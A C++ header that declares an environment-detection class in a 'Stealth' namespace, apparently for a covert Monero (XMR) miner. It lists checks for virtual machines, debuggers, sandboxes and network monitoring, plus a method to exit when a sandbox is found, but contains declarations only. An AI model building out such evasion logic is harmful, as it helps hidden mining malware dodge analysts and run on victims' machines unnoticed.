#ifndef XMR_ENVIRONMENT_DETECTOR_H
#define XMR_ENVIRONMENT_DETECTOR_H

#include <string>
#include <atomic>
#include <cstdint>
#include <memory>
#include <mutex>
#include <thread>
#include <vector>
#include <functional>
#include <stdexcept>
#include <map>


    namespace Stealth {

  class EnvironmentDetector {
  public:
    bool is_running_in_vm();
    bool is_running_in_debugger();
    bool is_running_in_sandbox();
    bool is_network_monitored();
    bool should_exit_if_sandbox();

  private:
    bool check_vm_cpu();
    bool check_vm_mac();
    bool check_vm_processes();
    bool check_debugger_linux();
    bool check_sandbox_files();
    bool check_sandbox_network();
  };

} // namespace Stealth

#endif
